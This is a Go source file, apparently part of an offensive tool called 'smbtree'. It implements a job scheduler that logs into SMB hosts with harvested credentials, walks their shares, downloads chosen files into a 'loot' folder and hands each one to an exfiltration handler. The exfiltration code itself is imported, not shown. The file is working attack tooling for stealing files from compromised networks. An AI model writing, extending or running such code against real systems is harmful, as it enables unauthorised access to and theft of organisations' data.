package queue

import (
	"container/heap"
	"fmt"
	"os"
	"path/filepath"
	"smbtree/pkg/exfil"
	"smbtree/pkg/scanner"
	"smbtree/pkg/smb"
	"smbtree/pkg/utils"
	"sync"
	"time"

	tea "github.com/charmbracelet/bubbletea"
)

// PriorityQueue implements heap.Interface and holds QueueItems
type PriorityQueue []*utils.QueueItem

func (pq PriorityQueue) Len() int { return len(pq) }

func (pq PriorityQueue) Less(i, j int) bool {
	// Priority items come first. If both priority, use ScheduledTime?
	// Or Priority bool overrides everything.
	if pq[i].Priority && !pq[j].Priority {
		return true
	}
	if !pq[i].Priority && pq[j].Priority {
		return false
	}
	// Earlier time first
	return pq[i].ScheduledTime.Before(pq[j].ScheduledTime)
}

func (pq PriorityQueue) Swap(i, j int) {
	pq[i], pq[j] = pq[j], pq[i]
}

func (pq *PriorityQueue) Push(x interface{}) {
	item := x.(*utils.QueueItem)
	*pq = append(*pq, item)
}

func (pq *PriorityQueue) Pop() interface{} {
	old := *pq
	n := len(old)
	item := old[n-1]
	*pq = old[0 : n-1]
	return item
}

type Scheduler struct {
	Queue       chan utils.QueueItem
	Output      chan tea.Msg
	WorkerCount int
	Exfil       *exfil.Handler
	LootDir     string

	// Internal
	pq PriorityQueue
	mu sync.RWMutex
}

func NewScheduler(workerCount int, exfilCfg exfil.Config) *Scheduler {
	return &Scheduler{
		Queue:       make(chan utils.QueueItem, 100),
		Output:      make(chan tea.Msg, 100),
		WorkerCount: workerCount,
		Exfil:       exfil.NewHandler(exfilCfg),
		LootDir:     "loot", // default
		pq:          make(PriorityQueue, 0),
	}
}

func (s *Scheduler) SetLootDir(p string) {
	if p != "" {
		s.LootDir = p
	}
}

func (s *Scheduler) Start() {
	// Start the main scheduling loop
	go s.scheduleLoop()
}

func (s *Scheduler) scheduleLoop() {
	// We need a way to distribute jobs to workers.
	// Channel 'jobs' to workers?
	workerQueue := make(chan utils.QueueItem)

	// Start workers
	for i := 0; i < s.WorkerCount; i++ {
		go s.worker(workerQueue)
	}

	for {
		var nextJob *utils.QueueItem
		var waitTime time.Duration

		if s.pq.Len() > 0 {
			// Peek at top
			s.mu.RLock()
			item := s.pq[0]
			s.mu.RUnlock()

			now := time.Now()

			if item.Priority || now.After(item.ScheduledTime) || now.Equal(item.ScheduledTime) {
				// Ready to run!
				nextJob = item
				// We'll try to send it. If successful, we pop.
			} else {
				// Wait until ScheduledTime
				waitTime = item.ScheduledTime.Sub(now)
			}
		} else {
			// No jobs scheduled, wait indefinitely for new input
			// (Select will block on s.Queue)
			waitTime = 1000 * time.Hour // arbitrary long time
		}

		// Timer channel
		var timerCh <-chan time.Time
		if nextJob == nil && s.pq.Len() > 0 {
			timer := time.NewTimer(waitTime)
			timerCh = timer.C
		} else if nextJob == nil {
			// Empty queue, just block on input
		} else {
			// Ready to run, but we must select between sending to worker OR receiving new job
			// If we can't send immediately, maybe we should receive new jobs
		}

		if nextJob != nil {
			select {
			case newJob := <-s.Queue:
				// Critical Fix: Explicitly allocate on heap to avoid pointer reuse issues
				jobPtr := new(utils.QueueItem)
				*jobPtr = newJob
				s.mu.Lock()
				heap.Push(&s.pq, jobPtr)
				s.mu.Unlock()

				f, _ := os.OpenFile("scheduler.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
				if f != nil {
					fmt.Fprintf(f, "Scheduler Recv: ID=%s\n", newJob.ID)
					f.Close()
				}

			case workerQueue <- *nextJob:
				// Successfully sent to worker
				f, _ := os.OpenFile("scheduler.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
				if f != nil {
					fmt.Fprintf(f, "Scheduler Dispatch: ID=%s -> Worker\n", nextJob.ID)
					f.Close()
				}

				s.mu.Lock()
				heap.Pop(&s.pq)
				s.mu.Unlock()
			}
		} else {
			select {
			case newJob := <-s.Queue:
				jobPtr := new(utils.QueueItem)
				*jobPtr = newJob
				s.mu.Lock()
				heap.Push(&s.pq, jobPtr)
				s.mu.Unlock()
			case <-timerCh:
				// Time to check queue again
			}
		}
	}
}

func (s *Scheduler) worker(jobs <-chan utils.QueueItem) {
	for job := range jobs {
		s.processJob(job)
	}
}

func (s *Scheduler) processJob(job utils.QueueItem) {
	f, _ := os.OpenFile("scheduler.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if f != nil {
		fmt.Fprintf(f, "Processing Job: ID=%s Type=%s Target=%s\n", job.ID, job.ActionType, job.Target)
		f.Close()
	}

	if job.Host == nil {
		return
	}

	session, err := smb.Connect(job.HostIP, job.Host.Creds)
	if err != nil {
		s.Output <- utils.JobResult{
			QueueID: job.ID,
			HostIP:  job.HostIP,
			Success: false,
			Error:   err.Error(),
		}
		return
	}
	defer session.Close()

	switch job.ActionType {
	case "PULL":
		// Target is "Share/Path"
		share, path := utils.SplitSharePath(job.Target)
		localDest := filepath.Join(s.LootDir, job.HostIP, share, path)

		err = session.DownloadFile(share, path, localDest)
		if err != nil {
			s.Output <- utils.JobResult{
				QueueID:    job.ID,
				HostIP:     job.HostIP,
				Success:    false,
				Error:      err.Error(),
				ActionType: "PULL",
				Target:     job.Target,
			}
			return
		}

		// Exfiltrate
		if err := s.Exfil.Exfiltrate(localDest); err != nil {
			s.Output <- utils.JobResult{
				QueueID:    job.ID,
				HostIP:     job.HostIP,
				Success:    false, // Mark as fail if exfil fails? Or partial?
				Error:      "Exfil failed: " + err.Error(),
				ActionType: "PULL",
				Target:     job.Target,
			}
			return
		}

		s.Output <- utils.JobResult{
			QueueID:    job.ID,
			HostIP:     job.HostIP,
			Success:    true,
			ActionType: "PULL",
			Target:     job.Target,
		}
	case "TREE":
		shares, err := scanner.ScanHost(session, job.Host, job.DepthParam)
		if err != nil {
			s.Output <- utils.JobResult{
				QueueID:    job.ID,
				HostIP:     job.HostIP,
				Success:    false,
				Error:      err.Error(),
				ActionType: "TREE",
			}
			return
		}
		s.Output <- utils.JobResult{
			QueueID:    job.ID,
			HostIP:     job.HostIP,
			Success:    true,
			Shares:     shares,
			ActionType: "TREE",
		}
	case "EXPAND_DIR":
		share, path := utils.SplitSharePath(job.Target)

		children, err := scanner.ScanDir(session, share, path, job.DepthParam)
		if err != nil {
			s.Output <- utils.JobResult{
				QueueID:    job.ID,
				HostIP:     job.HostIP,
				Success:    false,
				Error:      err.Error(),
				ActionType: "EXPAND_DIR",
			}
			return
		}
		// Return shares as "Children" roughly attached to a dummy root?
		// We'll pass them in Shares field of result, caller will attach.
		s.Output <- utils.JobResult{
			QueueID:    job.ID,
			HostIP:     job.HostIP,
			Success:    true,
			Shares:     children, // Reusing Shares field for children list
			ActionType: "EXPAND_DIR",
			Target:     job.Target,
		}
	}
}

// GetQueueSnapshot returns a thread-safe copy of the current queue items
func (s *Scheduler) GetQueueSnapshot() []utils.QueueItem {
	s.mu.RLock()
	defer s.mu.RUnlock()

	items := make([]utils.QueueItem, len(s.pq))
	for i, ptr := range s.pq {
		items[i] = *ptr
	}
	return items
}
